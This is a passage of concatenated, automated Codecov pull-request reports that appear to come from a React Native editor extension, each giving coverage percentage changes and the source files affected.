Coverage Diff           @@\nmaster     #583   +/-\n=======================================\n  Coverage   14.68%   14.68%         \n=======================================\n  Files          61       61         \n  Lines        3004     3004         \n  Branches      366      367    +1   \n=======================================\n  Hits          441      441         \n  Misses       2563     2563\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/nodeDebugWrapper.ts | 3.33% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 7b07080...7b61bc9. Read the comment docs.\n. # Codecov Report\nMerging #584 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #584   +/-\n=======================================\n  Coverage   15.61%   15.61%         \n=======================================\n  Files          61       61         \n  Lines        3010     3010         \n  Branches      368      368         \n=======================================\n  Hits          470      470         \n  Misses       2540     2540\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update a132470...5bc84ed. Read the comment docs.\n. # Codecov Report\nMerging #585 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #585   +/-\n=======================================\n  Coverage   15.61%   15.61%         \n=======================================\n  Files          61       61         \n  Lines        3010     3010         \n  Branches      368      368         \n=======================================\n  Hits          470      470         \n  Misses       2540     2540\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 11abbbd...45c7257. Read the comment docs.\n. # Codecov Report\nMerging #587 into master will decrease coverage by 0.02%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #587      +/-\n==========================================\n- Coverage   15.61%   15.58%   -0.03%   \n==========================================\n  Files          61       61            \n  Lines        3010     3015       +5   \n  Branches      368      368            \n==========================================\n  Hits          470      470            \n- Misses       2540     2545       +5\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/settingsHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/packager.ts | 0% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 26fa493...2001682. Read the comment docs.\n. # Codecov Report\nMerging #591 into master will not change coverage.\nThe diff coverage is 0%.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #591   +/-\n=======================================\n  Coverage   15.58%   15.58%         \n=======================================\n  Files          61       61         \n  Lines        3015     3015         \n  Branches      368      368         \n=======================================\n  Hits          470      470         \n  Misses       2545     2545\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/packager.ts | 0% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update e4dd9aa...c49db2d. Read the comment docs.\n. # Codecov Report\nMerging #592 into master will decrease coverage by 0.2%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #592      +/-\n==========================================\n- Coverage   15.58%   15.38%   -0.21%   \n==========================================\n  Files          61       61            \n  Lines        3028     3068      +40   \n  Branches      370      380      +10   \n==========================================\n  Hits          472      472            \n- Misses       2556     2596      +40\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/generalMobilePlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/settingsHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update e03193a...a7bff77. Read the comment docs.\n. # Codecov Report\nMerging #593 into master will increase coverage by <.01%.\nThe diff coverage is 15.38%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #593      +/-\n==========================================\n+ Coverage   15.58%   15.59%   +<.01%   \n==========================================\n  Files          61       61            \n  Lines        3015     3026      +11   \n  Branches      368      370       +2   \n==========================================\n+ Hits          470      472       +2   \n- Misses       2545     2554       +9\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/scriptImporter.ts | 32.25% <0%> (-0.53%) | :arrow_down: |\n| src/common/reactNativeProjectHelper.ts | 27.77% <0%> (-13.89%) | :arrow_down: |\n| src/debugger/appWorker.ts | 76.52% <40%> (-0.96%) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update b1f5d12...4f2867a. Read the comment docs.\n. # Codecov Report\nMerging #594 into master will decrease coverage by 0.01%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #594      +/-\n==========================================\n- Coverage   15.59%   15.58%   -0.02%   \n==========================================\n  Files          61       61            \n  Lines        3026     3028       +2   \n  Branches      370      370            \n==========================================\n  Hits          472      472            \n- Misses       2554     2556       +2\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/outputVerifier.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/extensionServer.ts | 3.07% <0%> (-0.03%) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update bb86934...09221f9. Read the comment docs.\n. # Codecov Report\nMerging #595 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #595   +/-\n=======================================\n  Coverage   15.38%   15.38%         \n=======================================\n  Files          61       61         \n  Lines        3068     3068         \n  Branches      380      380         \n=======================================\n  Hits          472      472         \n  Misses       2596     2596\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update e26a1f4...2f1e827. Read the comment docs.\n. # Codecov Report\nMerging #596 into master will not change coverage.\nThe diff coverage is 0%.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #596   +/-\n=======================================\n  Coverage   15.38%   15.38%         \n=======================================\n  Files          61       61         \n  Lines        3068     3068         \n  Branches      380      380         \n=======================================\n  Hits          472      472         \n  Misses       2596     2596\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/extensionServer.ts | 3.07% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update b87e8e2...190dfdb. Read the comment docs.\n. # Codecov Report\nMerging #600 into master will not change coverage.\nThe diff coverage is 0%.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #600   +/-\n=======================================\n  Coverage   15.38%   15.38%         \n=======================================\n  Files          61       61         \n  Lines        3068     3068         \n  Branches      380      380         \n=======================================\n  Hits          472      472         \n  Misses       2596     2596\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/generalMobilePlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 1174ee3...7cc9b42. Read the comment docs.\n. # Codecov Report\nMerging #602 into master will not change coverage.\nThe diff coverage is 0%.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #602   +/-\n=======================================\n  Coverage   15.38%   15.38%         \n=======================================\n  Files          61       61         \n  Lines        3068     3068         \n  Branches      380      381    +1   \n=======================================\n  Hits          472      472         \n  Misses       2596     2596\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/reactNativeProjectHelper.ts | 27.77% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 8457d3f...ab7563b. Read the comment docs.\n. # Codecov Report\nMerging #604 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #604   +/-\n=======================================\n  Coverage   15.38%   15.38%         \n=======================================\n  Files          61       61         \n  Lines        3068     3068         \n  Branches      381      381         \n=======================================\n  Hits          472      472         \n  Misses       2596     2596\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update b17c3a0...fac8ad5. Read the comment docs.\n. # Codecov Report\nMerging #605 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #605   +/-\n=======================================\n  Coverage   15.38%   15.38%         \n=======================================\n  Files          61       61         \n  Lines        3068     3068         \n  Branches      381      381         \n=======================================\n  Hits          472      472         \n  Misses       2596     2596\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 67d948c...5ed09ed. Read the comment docs.\n. # Codecov Report\nMerging #608 into master will not change coverage.\nThe diff coverage is 0%.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #608   +/-\n=======================================\n  Coverage   15.38%   15.38%         \n=======================================\n  Files          61       61         \n  Lines        3068     3068         \n  Branches      381      381         \n=======================================\n  Hits          472      472         \n  Misses       2596     2596\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/packager.ts | 0% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 2c0ba9b...b803c67. Read the comment docs.\n. # Codecov Report\nMerging #610 into master will decrease coverage by <.01%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #610      +/-\n==========================================\n- Coverage   15.38%   15.37%   -0.01%   \n==========================================\n  Files          61       61            \n  Lines        3068     3069       +1   \n  Branches      381      382       +1   \n==========================================\n  Hits          472      472            \n- Misses       2596     2597       +1\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/nodeDebugWrapper.ts | 3.29% <0%> (-0.04%) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update c12c9b1...634a30f. Read the comment docs.\n. # Codecov Report\nMerging #618 into master will decrease coverage by 0.22%.\nThe diff coverage is 1.81%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #618      +/-\n==========================================\n- Coverage   15.37%   15.15%   -0.23%   \n==========================================\n  Files          61       62       +1   \n  Lines        3069     3121      +52   \n  Branches      382      396      +14   \n==========================================\n+ Hits          472      473       +1   \n- Misses       2597     2648      +51\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/windows/windowsPlatform.ts | 0% <0%> (\u00f8) | |\n| src/extension/platformResolver.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/hostPlatform.ts | 23.71% <0%> (-5.04%) | :arrow_down: |\n| src/common/targetPlatformHelper.ts | 35.71% <33.33%> (-0.29%) | :arrow_down: |\n. # Codecov Report\n\nMerging #621 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #621   +/-\n=======================================\n  Coverage   15.15%   15.15%         \n=======================================\n  Files          62       62         \n  Lines        3121     3121         \n  Branches      396      396         \n=======================================\n  Hits          473      473         \n  Misses       2648     2648\n```\n. # Codecov Report\n\nMerging #622 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #622   +/-\n=======================================\n  Coverage   15.15%   15.15%         \n=======================================\n  Files          62       62         \n  Lines        3121     3121         \n  Branches      396      396         \n=======================================\n  Hits          473      473         \n  Misses       2648     2648\n```\n. # Codecov Report\n\nMerging #629 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #629   +/-\n=======================================\n  Coverage   15.15%   15.15%         \n=======================================\n  Files          62       62         \n  Lines        3121     3121         \n  Branches      396      396         \n=======================================\n  Hits          473      473         \n  Misses       2648     2648\n```\n. # Codecov Report\n\nMerging #632 into master will decrease coverage by 2.6%.\nThe diff coverage is 3.25%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #632      +/-\n==========================================\n- Coverage   15.15%   12.54%   -2.61%   \n==========================================\n  Files          62       83      +21   \n  Lines        3121     3977     +856   \n  Branches      396      517     +121   \n==========================================\n+ Hits          473      499      +26   \n- Misses       2648     3478     +830\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/settingsHelper.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/debugger/sourceMapsCombinator.ts | 94.23% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/commandPaletteHandler.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/rn-extension.ts | 8.82% <\u00f8> (-1.18%) | :arrow_down: |\n| src/extension/appcenter/auth/auth.ts | 0% <0%> (\u00f8) | |\n| src/extension/appcenter/appCenterConstants.ts | 0% <0%> (\u00f8) | |\n| src/extension/appcenter/codepush/release.ts | 0% <0%> (\u00f8) | |\n| ...ension/appcenter/api/appCenterClientCredentials.ts | 0% <0%> (\u00f8) | |\n| src/extension/appcenter/api/index.ts | 0% <0%> (\u00f8) | |\n| src/debugger/nodeDebugWrapper.ts | 3.29% <0%> (\u00f8) | :arrow_up: |\n| ... and 41 more | |\n. # Codecov Report\n\nMerging #633 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #633   +/-\n=======================================\n  Coverage   12.54%   12.54%         \n=======================================\n  Files          83       83         \n  Lines        3977     3977         \n  Branches      517      517         \n=======================================\n  Hits          499      499         \n  Misses       3478     3478\n```\n. # Codecov Report\n\nMerging #634 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #634   +/-\n=======================================\n  Coverage   12.54%   12.54%         \n=======================================\n  Files          83       83         \n  Lines        3977     3977         \n  Branches      517      517         \n=======================================\n  Hits          499      499         \n  Misses       3478     3478\n```\n. # Codecov Report\n\nMerging #636 into master will decrease coverage by <.01%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #636      +/-\n==========================================\n- Coverage   12.54%   12.54%   -0.01%   \n==========================================\n  Files          83       83            \n  Lines        3977     3979       +2   \n  Branches      517      517            \n==========================================\n  Hits          499      499            \n- Misses       3478     3480       +2\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| ...ension/appcenter/appCenterCommandPalleteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| ...c/extension/appcenter/appCenterExtensionManager.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #638 into master will not change coverage.\nThe diff coverage is 0%.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #638   +/-\n=======================================\n  Coverage   12.54%   12.54%         \n=======================================\n  Files          83       83         \n  Lines        3979     3979         \n  Branches      517      517         \n=======================================\n  Hits          499      499         \n  Misses       3480     3480\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/appcenter/appCenterStrings.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #639 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #639   +/-\n=======================================\n  Coverage   12.54%   12.54%         \n=======================================\n  Files          83       83         \n  Lines        3979     3979         \n  Branches      517      517         \n=======================================\n  Hits          499      499         \n  Misses       3480     3480\n```\n. # Codecov Report\n\nMerging #642 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #642   +/-\n=======================================\n  Coverage   12.54%   12.54%         \n=======================================\n  Files          83       83         \n  Lines        3979     3979         \n  Branches      517      517         \n=======================================\n  Hits          499      499         \n  Misses       3480     3480\n```\n. # Codecov Report\n\nMerging #643 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #643   +/-\n=======================================\n  Coverage   12.54%   12.54%         \n=======================================\n  Files          83       83         \n  Lines        3979     3979         \n  Branches      517      517         \n=======================================\n  Hits          499      499         \n  Misses       3480     3480\n```\n. # Codecov Report\n\nMerging #644 into master will decrease coverage by 0.4%.\nThe diff coverage is 1.57%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #644      +/-\n==========================================\n- Coverage   12.54%   12.13%   -0.41%   \n==========================================\n  Files          83       93      +10   \n  Lines        3979     4466     +487   \n  Branches      517      609      +92   \n==========================================\n+ Hits          499      542      +43   \n- Misses       3480     3924     +444\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| ...odepush/codepush-sdk/src/utils/validation-utils.ts | 42.85% <0%> (\u00f8) | |\n| ...codepush/codepush-sdk/src/cordova/cordova-utils.ts | 10.63% <0%> (\u00f8) | |\n| ...epush-sdk/src/update-contents/code-signing/sign.ts | 2.63% <0%> (\u00f8) | |\n| src/extension/appcenter/command/commandExecutor.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/telemetry.ts | 5.64% <0%> (\u00f8) | :arrow_up: |\n| ...sdk/src/update-contents/code-signing/hash-utils.ts | 5.19% <0%> (\u00f8) | |\n| ...nsion/appcenter/codepush/codepush-sdk/src/index.ts | 0% <0%> (\u00f8) | |\n| ...r/codepush/codepush-sdk/src/update-contents/zip.ts | 3.84% <0%> (\u00f8) | |\n| ...codepush/codepush-sdk/src/update-contents/index.ts | 0% <0%> (\u00f8) | |\n| ...nter/codepush/codepush-sdk/src/utils/file-utils.ts | 22.22% <0%> (\u00f8) | |\n| ... and 13 more | |\n. # Codecov Report\n\nMerging #645 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #645   +/-\n=======================================\n  Coverage   12.54%   12.54%         \n=======================================\n  Files          83       83         \n  Lines        3979     3979         \n  Branches      517      517         \n=======================================\n  Hits          499      499         \n  Misses       3480     3480\n```\n. # Codecov Report\n\nMerging #648 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #648   +/-\n=======================================\n  Coverage   12.54%   12.54%         \n=======================================\n  Files          83       83         \n  Lines        3979     3979         \n  Branches      517      517         \n=======================================\n  Hits          499      499         \n  Misses       3480     3480\n```\n. # Codecov Report\n\nMerging #650 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #650   +/-\n=======================================\n  Coverage   12.13%   12.13%         \n=======================================\n  Files          93       93         \n  Lines        4466     4466         \n  Branches      609      609         \n=======================================\n  Hits          542      542         \n  Misses       3924     3924\n```\n. # Codecov Report\n\nMerging #651 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #651   +/-\n=======================================\n  Coverage   12.13%   12.13%         \n=======================================\n  Files          93       93         \n  Lines        4466     4466         \n  Branches      609      609         \n=======================================\n  Hits          542      542         \n  Misses       3924     3924\n```\n. # Codecov Report\n\nMerging #653 into master will decrease coverage by 0.01%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #653      +/-\n==========================================\n- Coverage   12.13%   12.11%   -0.02%   \n==========================================\n  Files          93       93            \n  Lines        4466     4473       +7   \n  Branches      609      609            \n==========================================\n  Hits          542      542            \n- Misses       3924     3931       +7\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| ...epush-sdk/src/update-contents/code-signing/sign.ts | 2.5% <0%> (-0.14%) | :arrow_down: |\n| ...sdk/src/update-contents/code-signing/hash-utils.ts | 5.06% <0%> (-0.14%) | :arrow_down: |\n| ...r/codepush/codepush-sdk/src/update-contents/zip.ts | 3.44% <0%> (-0.4%) | :arrow_down: |\n. # Codecov Report\n\nMerging #654 into master will not change coverage.\nThe diff coverage is 0%.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #654   +/-\n=======================================\n  Coverage   12.11%   12.11%         \n=======================================\n  Files          93       93         \n  Lines        4473     4473         \n  Branches      609      609         \n=======================================\n  Hits          542      542         \n  Misses       3931     3931\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/appcenter/appCenterStrings.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/appcenter/command/commandExecutor.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #655 into master will not change coverage.\nThe diff coverage is 0%.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #655   +/-\n======================================\n  Coverage    12.1%   12.1%         \n======================================\n  Files          93      93         \n  Lines        4477    4477         \n  Branches      610     610         \n======================================\n  Hits          542     542         \n  Misses       3935    3935\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/appcenter/auth/auth.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/appcenter/api/createClient.ts | 9.09% <0%> (\u00f8) | :arrow_up: |\n| ...ension/appcenter/api/appCenterClientCredentials.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/appcenter/api/index.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #656 into master will decrease coverage by 0.01%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff            @@\nmaster    #656      +/-\n=========================================\n- Coverage   12.11%   12.1%   -0.02%   \n=========================================\n  Files          93      93            \n  Lines        4473    4477       +4   \n  Branches      609     610       +1   \n=========================================\n  Hits          542     542            \n- Misses       3931    3935       +4\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/appcenter/command/commandExecutor.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #657 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #657   +/-\n======================================\n  Coverage    12.1%   12.1%         \n======================================\n  Files          93      93         \n  Lines        4477    4477         \n  Branches      610     610         \n======================================\n  Hits          542     542         \n  Misses       3935    3935\n```\n. # Codecov Report\n\nMerging #658 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #658   +/-\n======================================\n  Coverage    12.1%   12.1%         \n======================================\n  Files          93      93         \n  Lines        4477    4477         \n  Branches      610     610         \n======================================\n  Hits          542     542         \n  Misses       3935    3935\n```\n. # Codecov Report\n\nMerging #663 into master will decrease coverage by 0.02%.\nThe diff coverage is 5%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #663      +/-\n==========================================\n- Coverage    12.1%   12.07%   -0.03%   \n==========================================\n  Files          93       93            \n  Lines        4477     4488      +11   \n  Branches      610      612       +2   \n==========================================\n  Hits          542      542            \n- Misses       3935     3946      +11\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/sourceMap.ts | 85.71% <0%> (-5.6%) | :arrow_down: |\n| src/common/reactNativeProjectHelper.ts | 25% <0%> (-2.78%) | :arrow_down: |\n| src/debugger/scriptImporter.ts | 29.41% <0%> (-2.85%) | :arrow_down: |\n| src/debugger/forkedAppWorker.ts | 86.56% <100%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #664 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #664   +/-\n=======================================\n  Coverage   12.07%   12.07%         \n=======================================\n  Files          93       93         \n  Lines        4488     4488         \n  Branches      612      612         \n=======================================\n  Hits          542      542         \n  Misses       3946     3946\n```\n. # Codecov Report\n\nMerging #666 into master will not change coverage.\nThe diff coverage is 0%.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #666   +/-\n=======================================\n  Coverage   12.07%   12.07%         \n=======================================\n  Files          93       93         \n  Lines        4488     4488         \n  Branches      612      612         \n=======================================\n  Hits          542      542         \n  Misses       3946     3946\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| ...odepush-sdk/src/react-native/react-native-utils.ts | 5.31% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #668 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #668   +/-\n=======================================\n  Coverage   12.07%   12.07%         \n=======================================\n  Files          93       93         \n  Lines        4488     4488         \n  Branches      612      612         \n=======================================\n  Hits          542      542         \n  Misses       3946     3946\n```\n. # Codecov Report\n\nMerging #677 into master will decrease coverage by 0.05%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #677      +/-\n==========================================\n- Coverage   15.04%   14.99%   -0.06%   \n==========================================\n  Files          62       62            \n  Lines        3137     3142       +5   \n  Branches      407      408       +1   \n==========================================\n- Hits          472      471       -1   \n- Misses       2665     2671       +6\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/rn-extension.ts | 9.82% <\u00f8> (\u00f8) | :arrow_up: |\n| src/common/remoteExtension.ts | 50% <0%> (-3.34%) | :arrow_down: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/extensionServer.ts | 2.29% <0%> (-0.79%) | :arrow_down: |\n| src/debugger/nodeDebugWrapper.ts | 3.19% <0%> (-0.04%) | :arrow_down: |\n. # Codecov Report\n\nMerging #679 into master will decrease coverage by 0.02%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #679      +/-\n==========================================\n- Coverage   12.07%   12.04%   -0.03%   \n==========================================\n  Files          93       93            \n  Lines        4488     4498      +10   \n  Branches      612      615       +3   \n==========================================\n  Hits          542      542            \n- Misses       3946     3956      +10\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/appcenter/helpers/vscodeUtils.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/appcenter/appCenterConstants.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/appcenter/appCenterStrings.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| ...ension/appcenter/appCenterCommandPalleteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| ...c/extension/appcenter/appCenterExtensionManager.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #682 into master will increase coverage by 3.02%.\nThe diff coverage is n/a.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #682      +/-\n==========================================\n+ Coverage   12.07%   15.09%   +3.02%   \n==========================================\n  Files          93       62      -31   \n  Lines        4490     3134    -1356   \n  Branches      612      406     -206   \n==========================================\n- Hits          542      473      -69   \n+ Misses       3948     2661    -1287\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/error/internalErrorCode.ts | 100% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/rn-extension.ts | 10% <\u00f8> (+1.17%) | :arrow_up: |\n| src/extension/settingsHelper.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/commandPaletteHandler.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #683 into master will decrease coverage by <.01%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #683      +/-\n==========================================\n- Coverage   12.07%   12.07%   -0.01%   \n==========================================\n  Files          93       93            \n  Lines        4488     4490       +2   \n  Branches      612      612            \n==========================================\n  Hits          542      542            \n- Misses       3946     3948       +2\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/nodeDebugWrapper.ts | 3.22% <0%> (-0.08%) | :arrow_down: |\n. # Codecov Report\n\nMerging #684 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #684   +/-\n=======================================\n  Coverage   15.09%   15.09%         \n=======================================\n  Files          62       62         \n  Lines        3134     3134         \n  Branches      406      406         \n=======================================\n  Hits          473      473         \n  Misses       2661     2661\n```\n. # Codecov Report\n\nMerging #686 into master will decrease coverage by 3.02%.\nThe diff coverage is 5.36%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #686      +/-\n==========================================\n- Coverage   15.09%   12.07%   -3.03%   \n==========================================\n  Files          62       93      +31   \n  Lines        3134     4490    +1356   \n  Branches      406      612     +206   \n==========================================\n+ Hits          473      542      +69   \n- Misses       2661     3948    +1287\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/commandPaletteHandler.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/settingsHelper.ts | 0% <\u00f8> (\u00f8) | :arrow_up: 